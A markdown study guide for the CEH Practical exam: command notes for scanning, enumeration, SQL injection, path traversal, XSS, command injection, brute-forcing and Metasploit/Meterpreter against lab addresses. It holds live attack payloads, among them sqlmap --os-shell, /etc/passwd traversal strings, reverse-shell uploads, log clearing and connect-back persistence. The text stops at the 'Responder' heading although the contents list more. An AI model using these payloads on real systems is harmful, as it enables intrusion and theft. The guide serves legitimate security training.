# C|EH Practical 

>Arav Budhiraja | 28th September 2021

# Table of Contents

- [Topics](#topics)
- [iLabs videos](#ilabs-videos)
- [Mapping a network](#mapping-a-network)
	- [Fping](#fping)
	- [Nmap](#nmap)
	- [Netdiscover](#netdiscover)
- [Nmap](#nmap-1)
	- [Basic Scan](#basic-scan)
	- [All ports scan](#all-ports-scan)
	- [Scanning multiple IPs](#scanning-multiple-ips)
	- [Discovering hosts and scanning ports of live hosts](#discovering-hosts-and-scanning-ports-of-live-hosts)
	- [Determining services version](#determining-services-version)
	- [Running default and safe scripts](#running-default-and-safe-scripts)
	- [Scanning specific ports](#scanning-specific-ports)
	- [Scanning a range of ports](#scanning-a-range-of-ports)
	- [SYN Scan](#syn-scan)
	- [TCP Scan](#tcp-scan)
	- [UDP Scan](#udp-scan)
	- [OS Detection](#os-detection)
	- [Aggressive Scan](#aggressive-scan)
	- [Loading hosts from a file](#loading-hosts-from-a-file)
	- [Running scripts](#running-scripts)
	- [Speeding up the scan](#speeding-up-the-scan)
	- [Storing results in a file](#storing-results-in-a-file)
- [Enumerating services](#enumerating-services) 
	- [Service Message Block(SMB)](#service-message-blocksmb)
	- [File Transfer Protocol(FTP)](#file-transfer-protocolftp)
	- [Simple Network Management Protocol(SNMP)](#simple-network-management-protocolsnmp)
	- [MySQL](#mysql)
- [Web Attacks](#web-attacks)
	- [File and Directory Enumeration](#file-and-directory-enumeration)
		- [Dirb](#dirb)
			- [Basic Scan](#basic-scan-1)
			- [Providing a wordlist](#providing-a-wordlist)
			- [Providing file extensions](#providing-file-extensions)
			- [Storing results in a file](#storing-results-in-a-file-1)
			- [Specifying a username and password](#specifying-a-username-and-password-2)
		- [Gobuster](#gobuster)
			- [Basic Scan](#basic-scan-2)
			- [Specifying file extensions](#specifying-file-extensions)
			- [Saving the output in a file](#saving-the-output-in-a-file)
			- [Specifying a username and password](#specifying-a-username-and-password-3)
	- [Nikto](#nikto)
	- [Wordpress](#wordpress)
		- [WPScan](#wpscan)
			- [Legend](#legend)
			- [Basic Scan](#basic-scan-3)
			- [Enumerating themes](#enumerating-themes)
			- [Enumerating plugins](#enumerating-plugins)
			- [Enumerating users](#enumerating-users)
			- [Enumerating all plugins](#enumerating-all-plugins)
			- [Enumerating all themes](#enumerating-all-themes)
			- [Finding vulnerable plugins](#finding-vulnerable-plugins)
			- [Finding vulnerable themes](#finding-vulnerable-themes)
			- [Password bruteforcing](#password-bruteforcing)
			- [Specifying a custom wp-content directory(Rare)](#specifying-a-custom-wp-content-directoryrare)
			- [Specifying a custom wp-plugins directory(Rare)](#specifying-a-custom-wp-plugins-directoryrare)
			- [Enumerating with 1 command](#enumerating-with-1-command)
			- [Updating the database](#updating-the-database)
		- [Zoom](#zoom)
			- [Installing Zoom](#installing-zoom)
			- [Scanning with Zoom](#scanning-with-zoom)
		- [Authenticated RCE](#authenticated-rce)
	- [SQL Injection](#sql-injection)
		- [GET](#get)
			- [Manual testing](#manual-testing)
			- [SQLMap](#sqlmap)
				- [To check if a parameter is injectable](#to-check-if-a-parameter-is-injectable)
				- [Specify a parameter](#specify-a-parameter)
				- [Get the users](#get-the-users)
				- [Get the database banner](#get-the-database-banner)
				- [Set a way to exploit SQL Injection(UNION(U) or BOOLEAN(B))](#set-a-way-to-exploit-sql-injectionunionu-or-booleanb)
				- [Get the databases](#get-the-databases)
				- [Get the tables of a database](#get-the-tables-of-a-database)
				- [Get the columns of a table](##get-the-columns-of-a-table)
				- [Get the contents of a table](#get-the-contents-of-a-table)
				- [Dumping everything](#dumping-everything)
				- [Executing SQL queries](#executing-sql-queries-1)
				- [Reading information from a file](#reading-information-from-a-file)
		-  [POST](#post)
			- [Manual testing](#manual-testing-1)
			- [SQLMap](#sqlmap-1)
				- [To check if a parameter is injectable](#to-check-if-a-parameter-is-injectable-1)
				- [Specify a parameter](#specify-a-parameter-1)
		- [Blind SQL Injection](#blind-sql-injection)
		- [Gaining a reverse shell](#gaining-a-reverse-shell)
	- [Insecure Direct Object Reference(IDOR)](#insecure-direct-object-referenceidor)
	- [Local File Disclosure(LFD)](#local-file-disclosure-lfd)
	- [Cross Site Scripting(XSS)](#cross-site-scriptingxss)
	- [Remote Command Execution(RCE)](#remote-command-executionrce)
- [Vulnerability Analysis](#vulnerability-analysis)
	- [Nmap scripts](#nmap-scripts)
		- [Finding the scripts](#finding-the-scripts)
		- [Vuln scripts](#vuln-scripts)
		- [Vulscan script](#vulscan-script)
		- [Vulners script](#vulners-script)
		- [All vulnerability scanning scripts](#all-vulnerability-scanning-scripts)
	- [Nessus](#nessus)
		- [Installing Nessus](#installing-nessus)
		- [Setting up Nessus](#setting-up-nessus)
		- [Scanning](#scanning)
- [Exploitation](#exploitation)
	- [SearchSploit](#searchsploit)
		- [Finding an exploit](#finding-an-exploit)
		- [Reading exploit code](#reading-exploit-code)
		- [Copying exploit code to current directory](#copying-exploit-code-to-current-directory)
	- [Metasploit](#metasploit)
	- [Meterpreter](#meterpreter)
		- [Listing and getting into sessions](#listing-and-getting-into-sessions)
		- [Basic commands](#basic-commands)
		- [Privilege Escalation](#privilege-escalation)
		- [Scripts](#scripts)
			- [ARP Scanner](#arp-scanner)
			- [Get GUI Access](#get-gui-access)
			- [Setup persistence](#setup-persistence)
	- [Responder](#responder) 
		- [Capturing a hash](#capturing-a-hash)
		- [Cracking a hash](#cracking-a-hash)
- [Steganography](#steganography)
	- [Snow](#snow)
	- [Quick Stego](#quick-stego)
	- [Open Stego](#open-stego)
	- [StegHide](#steghide)
	- [Strings](#strings)
	- [Exiftool](#exiftool)
	- [Binwalk](#binwalk)
	- [Foremost](#foremost)
- [Cryptography](#cryptography)
	- [HashCalc](#hashcalc)
	- [MD5 Calculator](#md5-calculator)
	- [CryptoForge](#cryptoforge)
	- [BCTextEncoder](#bctextencoder)
	- [Cryptool](#cryptool)
	- [VeraCrypt](#veracrypt)
- [Generating a wordlist](#generating-a-wordlist)
	- [Crunch](#crunch)
	- [Cewl](#cewl)
	- [Cupp](#cupp)
- [Hydra](#hydra)
	- [Specifying a user list and password list](#specifying--a-user-list-and-password-list)
	- [Specifying a username and password list](#specifying-a-username-and-password-list)
	- [Specifying a user list and password](#specifying-a-user-list-and-password)
	- [Specifying a port if it is not the default one](#specifying-a-port-if-it-is-not-the-default-one)
	- [Bruteforcing services](#bruteforcing-services)
		- [FTP](#ftp)
		- [SSH](#ssh)
		- [SMB](#smb)
		- [MySQL](#mysql-1)
		- [RDP](#rdp-1)
		- [HTTP POST Form](#http-post-form)
- [Password cracking](#password-cracking) 
	- [Hash Identifier](#hash-identifier)
	- [John the Ripper](#john-the-ripper)
	- [Hashcat](#hashcat)
	- [PwDump7 and Ophcrack](#pwdump7-and-ophcrack)
	- [Rainbow Crack](#rainbow-crack)
- [Useful Windows commands](#useful-windows-commands)
- [Wireshark](#wireshark) 
	- [Filters](#filters)
		- [Capture Filters](#capture-filters)
		- [Display Filters](#display-filters)
	- [Customizing Wireshark](#customizing-wireshark)
	- [Checking all protocols in a capture](#checking-all-protocols-in-a-capture)
	- [Finding all IPs in a capture](#finding-all-ips-in-a-capture)
	- [OS Detection by TTL and Window Size](#os-detection-by-ttl-and-window-size)
	- [Detecting a SYN Flood](#detecting-a-syn-flood)
	- [Finding a trojan](#finding-a-trojan)
	- [Finding data sent/received by Covert TCP](#finding-data-sentreceived-by-covert-tcp)
- [Cheatsheets](#cheatsheets)

# Topics

![Topics](topics.png)

# [iLabs Videos](https://www.youtube.com/playlist?list=PLrrgFyE6PtlaCixUxJPM0Y9Peye6iCewH)

# Mapping a network

#### Fping

Uses ICMP and hence it is less reliable 

```bash
fping -a -g 10.10.10.0/24 2>/dev/null
```

#### Nmap

```bash
nmap -sn 10.10.10.0/24
nmap -sn 10.10.10.*
```

#### Netdiscover

More reliable as it uses ARP

```bash
sudo netdiscover -r 10.10.10.0/24 -i eth0
```

# Nmap

#### Basic scan

```bash
nmap 10.10.10.3
```

#### All ports scan

```bash
nmap -p- 10.10.10.3
```

#### Scanning multiple IPs

```bash
nmap 10.10.10.3,5,7
nmap 10.10.10.3, 10.10.10.5
nmap 10.10.10.0/24 (Scanning the entire network)
nmap 10.10.10.* (Scanning the entire network)
```

#### Discovering hosts and scanning ports of live hosts

```bash
nmap -sP 10.10.10.0/24
```

#### Determining services version

```bash
nmap -sV 10.10.10.3
```

#### Running default and safe scripts

```bash
nmap -sC 10.10.10.3
```

#### Scanning specific ports 

```bash
nmap -p 21,22,80,443,8080 10.10.10.3
```

#### Scanning a range of ports

```bash
nmap -p 100-500 10.10.10.3
```

#### SYN Scan

```bash
nmap -sS 10.10.10.3
```

#### TCP Scan

```bash
nmap -sT 10.10.10.3
```

#### UDP Scan

```bash
nmap -sU 10.10.10.3
```

#### OS Detection

```bash
sudo nmap -O 10.10.10.3
```

#### Aggressive scan

```bash
nmap -A 10.10.10.3
```

#### Loading hosts from a file

```bash
nmap -iL hosts.txt
```

#### Running scripts

```bash
nmap --script vuln 10.10.10.3
nmap --script=ssl-heartbleed 10.10.10.3
nmap --script=smb* 10.10.10.3
```

#### Speeding up the scan

```bash
nmap -T4 10.10.10.3
nmap -T5 10.10.10.3
```

#### Storing results in a file

```bash
nmap -oN 10.10.10.3
```

# Enumerating services

## Service Message Block(SMB)

### nmblookup 

```bash
nmblookup -A 10.10.10.3
```

### enum4linux

#### Enumerate shares

```bash
enum4linux -S 10.10.10.3
```

#### OS Detection

```bash
enum4linux -o 10.10.10.3
```

#### NMBLookup

```bash
enum4linux -n 10.10.10.3
```

#### Password Policy

```bash
enum4linux -P 10.10.10.3
```

#### Users

```bash
enum4linux -U 10.10.10.3
```

#### Specifying a username and password

```bash
enum4linux -u admin -p pass123
```

#### All information

```bash
enum4linux 10.10.10.3
```

### SMBMap

#### List shares

```bash
smbmap -H 10.10.10.3
```

#### Specifying a username and password

```bash
smbmap -H -u admin -p pass123 10.10.10.3
```

#### Recursively search 

```bash
smbmap -R -H 10.10.10.3
```

### SMB Client

#### List shares

```bash
smbclient -L //10.10.10.3
```

#### Specifying a username 

```bash
smbclient -U admin -L //10.10.10.3
```

#### Connecting to a share

```bash
smbclient //10.10.10.3/share
smbclient -U admin //10.10.10.3/share
```

### Nmap

#### Checking if service is running

```bash
nmap -p 445 10.10.10.3
```

#### Full enumeration

```bash
nmap -p 445 -sC -sV -A 10.10.10.3
```

#### Enumerate shares

```bash
nmap --script=smb-enum-shares 10.10.10.3
```

#### Enumerate users

```bash
nmap --script=smb-enum-users 10.10.10.3
```

#### Bruteforce

```bash
nmap --script=smb-brute 10.10.10.3
```

#### OS Detection

```bash
nmap --script=smb-os-discovery 10.10.10.3
```

#### Vulnerability scanning

```bash
nmap --script smb-check-vulns.nse --script-args=unsafe=1 10.10.10.3
nmap --script=smb-vuln* 10.10.10.3
```

#### All scripts

```bash
nmap --script=smb* 10.10.10.3
```

## File Transfer Protocol(FTP)

### Nmap

#### Checking if service is running

```bash
nmap -p 21 10.10.10.3
```

#### Bruteforce

```bash
nmap --script=ftp-brute 10.10.10.3
```

```bash
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 > set RHOSTS 10.10.10.3
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > set USER_FILE /home/kali/users.txt
msf6 > run
```

#### Check for anonymous access

```bash
nmap --script=ftp-anon 10.10.10.3
```

#### OS Detection

```bash
nmap --script=ftp-syst 10.10.10.3
```

#### Checking for VSFTPD 2.3.4

```bash
nmap --script=ftp-vsftpd-backdoor 10.10.10.3
```

#### Checking for ProFTPD 1.3.3c

```bash
nmap --script=ftp-proftpd-backdoor 10.10.10.3
```

#### Full enumeration 

```bash
nmap -sV -sC -p 21 -A 10.10.10.3
```

## Simple Network Management Protocol(SNMP)

#### Checking if service is running

```bash
nmap -sU 161,162 10.10.10.3
```

#### Nmap scripts

```bash
nmap -sU -p 161 --script=snmp* 10.10.10.3
```

### Snmp-check

```bash
snmp-check 10.10.10.3
```

### Metasploit

#### Detailed enumeration

```bash
msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(snmp_enum) > set RHOSTS 10.10.10.3
msf6 auxiliary(snmp_enum) > run
```

#### Users

```bash
msf6 > use auxiliary/scanner/snmp/snmp_enumusers
msf6 auxiliary(snmp_enumusers) > set RHOSTS 10.10.10.3
msf6 auxiliary(snmp_enumusers) > run
```

#### Shares

```bash
msf6 > use auxiliary/scanner/snmp/snmp_enumshares
msf6 auxiliary(snmp_enumshares) > set RHOSTS 10.10.10.3
msf6 auxiliary(snmp_enumshares) > run
```

#### Bruteforce

```bash
msf6 > use auxiliary/scanner/snmp/snmp_login
msf6 auxiliary(snmp_login) > set RHOSTS 10.10.10.3
msf6 auxiliary(snmp_login) > run
```

## MySQL

### Getting basic information

```bash
nmap --script=mysql-info 10.10.10.3
```

### Finding usernames

```bash
nmap --script=mysql-enum 10.10.10.3
```

### Checking if accounts have an empty password

```bash
nmap --script=mysql-empty-password 10.10.10.3
```

### Bruteforcing

```bash
nmap --script=mysql-brute --script-args userdb=./users.txt passdb=./passwords.txt  10.10.10.3
```

### Dumping hashes 

```bash
nmap 10.10.10.3 --script=mysql-dump-hashes --script-args username=root,password=toor
```

### Executing SQL queries

```bash
msf6 > use auxiliary/admin/mysql/mysql_sql
msf6 auxiliary(mysql_sql) > set PASSWORD toor
msf6 auxiliary(mysql_sql) > set RHOST 10.10.10.3
msf6 auxiliary(mysql_sql) > set USERNAME root
msf6 auxiliary(mysql_sql) > set SQL select user()
msf6 auxiliary(mysql_sql) > run
```

# Web Attacks

## File and Directory enumeration

### Dirb

#### Basic scan

```bash
dirb http://10.10.10.3
```

#### Providing a wordlist

```bash
dirb http://10.10.10.3 wordlist.txt
```

#### Providing file extensions

```bash
dirb http://10.10.10.3 -X .php,.html,.txt
```

#### Storing results in a file

```bash
dirb http://10.10.10.3 -o results.txt
```

#### Specifying a username and password

```bash
dirb http://10.10.10.3 -u admin:password
```

## Gobuster

#### Basic scan

```bash
gobuster dir -u http://10.10.10.3 -w wordlist.txt
```

#### Specifying file extensions

```bash
gobuster dir  -u http://10.10.10.3 -w wordlist.txt -x html,txt,php
```

####  Saving the output in a file 

```bash
gobuster dir  -u http://10.10.10.3 -w wordlist.txt -o results.txt
```

#### Specifying a username and password

```bash
gobuster dir  -u http://10.10.10.3 -w wordlist.txt -U admin -P password
```

## Finding vulnerabilities 

### Nikto

```bash
nikto -h http://10.10.10.3
nikto -h https://10.10.10.3 -ssl
```

## Wordpress 

### WPScan

#### Legend

Red [!] -> Vulnerable 

Green [+] -> Enumeration results

Yellow [!] -> Failed operation

Blue [i] -> Patch

#### Basic scan

```bash
wpscan --url http://10.10.10.3
```

#### Enumerating themes

```bash
wpscan --url http://10.10.10.3 -e t
```

#### Enumerating plugins

```bash
wpscan --url http://10.10.10.3 -e p
```

#### Enumerating users

```bash
wpscan --url http://10.10.10.3 -e t
```

#### Enumerating all plugins

```bash
wpscan --url http://10.10.10.3 -e ap
```

#### Enumerating all themes

```bash
wpscan --url http://10.10.10.3 -e at
```

#### Finding vulnerable plugins

```bash
wpscan --url http://10.10.10.3 -e vp
```

#### Finding vulnerable themes

```bash
wpscan --url http://10.10.10.3 -e vt
```

#### Password bruteforcing

```bash
wpscan --url http://10.10.10.3 --passwords rockyou.txt 
wpscan --url http://10.10.10.3 --passwords rockyou.txt -U admin
wpscan --url http://10.10.10.3 --passwords rockyou.txt --usernames users.txt
```

#### Specifying a custom wp-content directory(Rare)

```bash
wpscan --url http://10.10.10.3 --wp-content-dir my-content
```

#### Specifying a custom wp-plugins directory(Rare)

```bash
wpscan --url http://10.10.10.3 --wp-plugins-dir my-plugins
```

### Enumerating with 1 command

```bash
wpscan -u http://10.10.10.3 -e at -e ap -e u
wpscan -u http://10.10.10.3 -e vt -e vp
```

#### Updating the Database

```bash
wpscan --update
```

### Zoom

#### Installing Zoom

```bash
git clone https://github.com/gcxtx/zoom
cd zoom
pip3 install -r requirements.txt
```

#### Scanning with Zoom

```bash
python3 zoom.py -u http://10.10.10.3
```

### Authenticated RCE

* Go to http://10.10.10.3/wp-admin and login in with your credentials 
* In the left bar, click on 'Appearance' and then on 'Themes'
* On the top, click on 'Upload theme'
* Upload a PHP reverse shell
* Click on 'Install Now'
* Now setup a netcat listener and then check `/wp-content/uploads` where it should be stored

This process can be automated using metasploit

```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
msf6 exploit(wp_admin_shell_upload) > set RHOST 10.10.10.3
msf6 exploit(wp_admin_shell_upload) > set USERNAME admin 
msf6 exploit(wp_admin_shell_upload) > set PASSWORD password                   
msf6 exploit(wp_admin_shell_upload) > exploit
```

## SQL Injection

### GET 

#### Manual testing

First we should check if the website has any GET parameters 

Once we can confirm the above, try appending a quote 

```txt
http://10.10.10.3/login.php?id=1'
```

If it returns a SQL error, the website is vulnerable

We can also use boolean based SQL injection in which we use the 'OR' and 'AND' operators

```txt
http://10.10.10.3/login.php?id=1 OR 1=1; -- - (No error)
http://10.10.10.3/login.php?id=1 OR 1=2; -- - (No error)
http://10.10.10.3/login.php?id=1 AND 1=1; -- - (No error)
http://10.10.10.3/login.php?id=1 AND 1=2; -- - (Error)
```

Another way to check is by union based injection

```txt
http://10.10.10.3/login.php?id=1 UNION SELECT user(); -- -
```

This should return the user

However, if an error is displayed by only appending a quote, then we can move on to exploitation

Note: Try replacing '-- -' with '#' if the above methods are not working

#### SQLMap

#### To check if a parameter is injectable

```bash
sqlmap -u http://10.10.10.3/login.php?id=1
```

#### Specify a parameter

```bash
sqlmap -u http://10.10.10.3/login.php?id=1 -p id
```

#### Get the users

```bash
sqlmap -u http://10.10.10.3/login.php?id=1 --users
```

#### Get the database banner 

```bash
sqlmap -u http://10.10.10.3/login.php?id=1 -b
```

#### Set a way to exploit SQL Injection(UNION(U) or BOOLEAN(B))

```bash
sqlmap -u http://10.10.10.3/login.php?id=1 --dbs --technique=U
sqlmap -u http://10.10.10.3/login.php?id=1 --dbs --technique=B
```

#### Get the databases 

```bash
sqlmap -u http://10.10.10.3/login.php?id=1 --dbs
```

#### Get the tables of a database

```bash
sqlmap -u http://10.10.10.3/login.php?id=1 -D userinfo --tables
```

#### Get the columns of a table

```bash
sqlmap -u http://10.10.10.3/login.php?id=1 -D userinfo -T credentials --columns
```

#### Get the contents of a table

```bash
sqlmap -u http://10.10.10.3/login.php?id=1 -D userinfo -T credentials --dump
```

#### Dumping everything

```bash
sqlmap -u http://10.10.10.3/login.php?id=1 --dump
sqlmap -u http://10.10.10.3/login.php?id=1 -a (More information)
```

#### Executing SQL queries

```bash
sqlmap -u "http://10.10.10.3/login.php?id=1" -D userinfo --sql-query "SELECT * FROM credentials;"
```

#### Reading information from a file

First we have to capture the request containing injectable parameters with Burp suite and save it

```bash
sqlmap -r request.txt --dbs
```

### POST

#### Manual testing

We should check for these in login forms

To get the names of the parameters, intercept the connection with Burp and check the parameters in the body

A simple way to check is by using these payloads

```txt
'
' OR 1=1;#
' OR 1=1;-- -
' AND 1='1
```

If we are unsure, we can just send try testing the parameters with SQLMap

#### SQLMap

#### Checking if a parameter is injectable

```bash
sqlmap -u http://10.10.10.3/login.php?id=1 --data='user=a&pass=a'
```

##### Specify a parameter

```bash
sqlmap -u http://10.10.10.3/login.php?id=1 --data='user=a&pass=a'-p user
```

All commands used in GET SQL injection can be used here

### Blind SQL Injection

In this case, no results are displayed to us

However, we can test it by using boolean SQL injection

```txt
http://10.10.10.3/login.php?id=1 AND 1=1; -- - (No error)
http://10.10.10.3/login.php?id=1 AND 1=2; -- - (Error)
```

If the above works, then we can dump everything in the database with SQLMap

### Gaining a reverse shell

This will not work most of the times

* First capture the request containing injectable parameters with Burp suite 
* Now we have to find databases

```bash
sqlmap -r request.txt --dbs
```

* Once we have a database, we can attempt to get a reverse shell

```bash
sqlmap -r request.txt -D userinfo --os-shell
```

## Insecure Direct Object Reference(IDOR)

When a web app provides direct access to information which does not belong to that user

Lets a hacker read/write/delete data of another user 

For example, lets say we have a social media website with a bunch of users

```txt

https://social.com/user/4722

Response:

{
id:4722,
username:'test',
pass:'123456'
}
```

However, we can change the id from '4722' to something such as 1,2 or 3

```txt

https://social.com/user/1

Response:

{
id:1,
username:'admin',
pass:'mypassword123'
}
```

If the user id is not being passed via a GET request, we can change the id in the POST request

```txt

https://social.com/users/info

Request:

id=1

Response:

{
id:1,
username:'admin',
pass:'mypassword123'
}
```

Best way to test is to create 2 users and use their IDs to check for IDOR

Look for IDs in requests 

Sometimes the web app may use some encryption/encoding such as JWT or base64

If the user's ID is long and random, we can check for places where the user ID is leaked. Such as the location of the user's profile picture

Leave Burp Suite running in the background so that we can find any user IDs

## Local File Disclosure (LFD)

Allows a hacker to fetch any file on a local system 

```txt
https://example.com/view.php?file=test.jpg (normal)
https://example.com/view.php?file=../../../../etc/passwd (malicious)
```

If we are not sure about the location of our current working directory, we can keep on adding '../' as in Linux, extra parent directories will not make a difference

In some cases, we may not have to use '../'

```txt
https://example.com/view.php?file=/etc/passwd
```

If the web app is not allowing us to append '../', we can try URL encoding the path

```txt
https://example.com/view.php?file=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
```

Or try replacing '../' with '.../.' or '....//'

```txt
https://example.com/view.php?file=....//....//....//....//etc/passwd
```

If the web app is appending a file extension to the end of the file, we can try appending a question and null byte

```txt
https://example.com/view.php?file=../../../../etc/passwd?%00
```

## Cross Site Scripting(XSS)

<a class="cross-site-scripting"></a>
Allows hacker to execute javascript code on a victim's browser

In this attack, a hacker inserts a javascript payload into a victim's browser. Once the code is executed, the victims's browser can be controlled by the hacker. The hacker can read/modify/delete content of websites, steal cookies and phish 

Most common payload is 

```html
<script>alert("hello")</script>
```

#### Types

* Reflected - Payload is injected from a request and is reflected in the code of the website leading to javascript execution
* Stored - Payload is stored in the server and is triggered once the victim visits the vulnerable web page
* DOM(Document Object model) - Payload is taken from the request and writes the data to a vulnerable DOM 

#### Reflected 

Data we send to a web app is reflected in its content 

Best place to look for XSS is to check for places where we can insert HTML

We should always check the source code of the page to see where our input is being reflected 

### Stored

Also known as persistent XSS

Stored in the server's database and is reflected to a user when he/she visits the vulnerable web page 

Best place to look for stored XSS is a text input where the data we enter is stored somewhere. Example: Comments 

### DOM

Javascript reflects data from an untrusted resource and passes it to a function 

### Bypassing filters 

#### Case 1 - Escaping quotes

Lets say that there is a website with an input field

```html
<input  value="">
```

If we type an XSS payload, it will not work since HTML will treat it like a string as it is in double quotes 

```html
<input  value="<script>alert("hello")</script>">
```

However, we can bypass this using test ">. It will treat 'test' as a string, close the input tag and trigger our payload. The payload would be `test"><script>alert("hello")</script>`

```html
<input  value="test"><script>alert("hello")</script>">
```

#### Case 2 - Escaping a tag

Lets say that there is a website with an input field which reflects our input to the title of the page

So if we type 'test' in the field, then the title will look like this

```html
<title>test</title>
```

To escape this, we can simply close the title tag and then inject our payload 

```html
<title>test </title> <script>alert(1)</script>
```

#### Case 3 - Escaping a variable

Lets say that there is a website with an input field which reflects our input to a javascript variable

```js
var a = 'test';
```

To get XSS here, we can first close the single quote, inject our payload and then comment out the rest of the code. The payload would be `' + alert(1); //`

```js
var a = 'test ' + alert(1); //';
```

## Remote Command Execution(RCE)

Allows a hacker to execute commands remotely on a system

Can be done by injecting a command or code

Lets say that we have a website which accepts an id number and runs a script to check if its an even number 

```txt
https://example.com/even.php?num=2
```

This will return a script and using that number as an argument 

```txt
$ ./checkEven 2
```

There are many ways to check for an RCE in this scenario


```md
|   URL         | Command | 
| ------------- |:-------------:|
| https://example.com/even.php?num=2;ls | ./checkEven 2; ls | 
| https://example.com/even.php?num=2&&%20ls | ./checkEven 2 && ls|
| https://example.com/even.php?num=2%20&%20ls | ./checkEven 2 & ls| 
| https://example.com/even.php?num=2%20$(ls)  | ./checkEven 2 $(ls) |
| https://example.com/even.php?num=2%20|%20ls | ./checkEven 2 | ls | 
```

This will check the number and display even/odd and the output of the ls command

Best and safe commands to run: ls, pwd, uname -a, id and hostname

If we are able to run code, then we can execute an OS command with the program 

We should check for an RCE at places from where data is being sent to the server and data is being sent back to us

# Vulnerability Analysis

## Nmap scripts

### Finding the scripts

```bash
cd /usr/share/nmap/scripts
ls -al *vuln*
```

### Vuln scripts

Does the best job in most cases

```bash
nmap --script vuln 10.10.10.3
```

### Vulscan script

```bash
cd /usr/share/nmap/scripts/vulscan
sudo wget https://raw.githubusercontent.com/scipag/vulscan/master/vulscan.nse
nmap --scripts-updatedb
nmap --script=vulscan 10.10.10.3
```

### Vulners script

```bash
cd /usr/share/nmap/scripts/vulners
sudo wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse
nmap --scripts-updatedb
nmap --script=vulners 10.10.10.3
```

### All vulnerability scanning scripts

```bash
nmap --script=*vuln* 10.10.10.3
```

## Nessus

### Installing Nessus

* Go to https://tenable.com/products/nessus and click on the 'Download' button for 'nessus Essentials'
* Create an account
* Now select the version you want to use and download the binary
* Install Nessus with these commands

```bash
cd ~/Downloads
sudo dpkg -I Nessus*.deb
```

### Setting up Nessus

* Start the Nessus service

```bash
sudo /etc/init.d/nessusd start
```

* Open a web browser and go to https://localhost:8834
* Click on 'Continue' and then on 'Skip' 
* Type the activation code. The activation code is sent to your registered email.Click on 'Continue' 
* Create a user account by typing a username and password and click on 'Submit'
* After sometime, we should be in the Nessus menu

### Scanning 

* On the left, click on 'Policies' and then on 'Create a new policy'
* Select 'Advanced Scan'
* Provide a name and description
* On the mini bar, click on 'Discovery' and turn off 'Ping the remote host' 
* Click on 'Advanced' and at the bottom set 'Max number of concurrent TCP sessions per host' and 'Max number of concurrent TCP sessions per scan' to 'unlimited'
* On the top, click on 'Credentials' and provide any credentials you have for a service
* Finally, click on 'Save' at the bottom
* Now click on 'My Scans' and click on 'Create a new scan'
* On the top click on 'User Defined' and select the policy
* Provide a name and description for the scan
* In the 'Targets' section provide an IP/IPs/range of IPs
* Go to the bottom and click on 'Save' and then on 'Launch'
* This will start our scan
* The scan ends if we see a ✔next to 'Last Modified'
* Click on the name of your scan and it will display the results
* Under the 'Vulnerabilities' tab, we can see all the vulnerabilities and how severe they are. If we click on the box next to the name of a vulnerability, it will display information about it
* We can click on 'Export' in the top right and select 'PDF' which will generate a PDF report of the vulnerabilities found be Nessus

# Exploitation

## SearchSploit

Used to find exploits for software/services

#### Finding an exploit

```bash
searchsploit vsftptd 2.3.4
searchsploit ms17-010
```

#### Reading exploit code

```bash
searchsploit -x exploits/windows/remote/42031.py
```

#### Copying exploit code to current directory

```bash
searchsploit -m exploits/windows/remote/42031.py
```

## Metasploit

The basic workflow of using it is:

1)Identifying a vulnerable service

2)Finding an exploit for it

3)Configuring the exploit and payload

4)Running the exploit and gaining access to the machine

#### Launching

```bash
sudo msfconsole
```

#### Finding a module

```bash
search eternalblue
search eternalblue vsftpd
```

#### Metasploit modules

exploit: Used to exploit and gain access to the machine

auxiliary: Used to enumerate versions or detect vulnerability 

post: Used to perform actions after a successful exploit

#### Using a module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

#### Getting module information

```bash
info exploit/windows/smb/ms17_010_eternalblue
```

#### Display options

```bash
show options
```

#### Setting options

```bash
set OPTION VALUE
set RHOST 10.10.2.15
set payload windows/meterpreter/reverse_tcp
```

##### Important terms

RHOST: Vulnerable machine’s IP

RPORT: The port which the vulnerable service on the victim machine is listening on

LHOST: The hacker’s IP

LPORT: The port on which the hacker’s machine will listen on to receive a connection

PAYLOAD - Malicious code giving us command execution

#### Running a module

```bash
run OR exploit
```

## Meterpreter

Used for privilege escalation, transferring files and gathering information

#### Listing and getting into sessions

```bash
sessions -l
sessions -i 1
```

#### Basic commands

help - Display all commands

sysinfo - Displays system information

ifconfig - Displays network card information

route - Get information about the routing table

getuid - Check which user we are

cat - Read a file

```bash
meterpreter > cat file.txt
```

pwd - Display the current directory

clearev - Clears the event log

download - Download a file from victim machine to our machine

```bash
meterpreter >download C:\password.txt /home/kali/pass.txt
```

upload - Upload a file from our machine to the victim machine

```bash
meterpreter >upload /home/kali/virus.exe C:\virus.exe
```

ps - List processes

ls - List files in the current directory

hashdump - Dump password hashes of all users from the SAM file. Admin privileges required

shell - Hop into a terminal session

migrate - Move to a different process to remain stealthy. May break our session

```bash
migrate <PID>
```

background - Runs the session in the background and lets us have access to the normal metasploit prompt

exit - Kill the meterpreter session

#### Privilege Escalation

To try to escalate our privileges, we can run `getsystem`

However in most windows machine, User Account Control prevents this

We can bypass UAC with a metasploit exploit

```bash
meterpreter > background
msf6 > use exploit/windows/local/bypassuac
```

Depending upon the meterpreter session's architecture set the target as 0 for x86 and 1 for x64

```bash
msf6 > set target 0
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.10.7
msf6 > set LPORT 4444
msf6 > exploit
```

And now we can run `getsystem` in the new session and escalate our privileges

#### Scripts

#### ARP Scanner

Only works on windows 

```bash
run arp_scanner 10.10.10.1/24
```

#### Get GUI Access

Admin privileges required

#### RDP

```bash
meterpreter > background
msf6 > use post/windows/manage/enable_rdp
msf6 post(enable_rdp) > set SESSION 1
msf6 post(enable_rdp) > set USERNAME test
msf6 post(enable_rdp) > set PASSWORD password123
msf6 post(enable_rdp) > exploit
```

And now we can connect to the machine with rdesktop

```bash
rdesktop -u test -p password123 10.10.10.3
```

#### VNC

```bash
meterpreter > run vnc
```

#### Setup persistence 

```bash
meterpreter > run persistence -U -i 20 -p 80 -r 10.10.10.5
```

-U is to specify that we have user privileges. -S can be used to specify that we have system privileges

-i is the interval after which the target will connect back to us to maintain persistence. It is in seconds

-p is used to specify the listening port

-r is used to specify the hacker’s IP

## Responder 

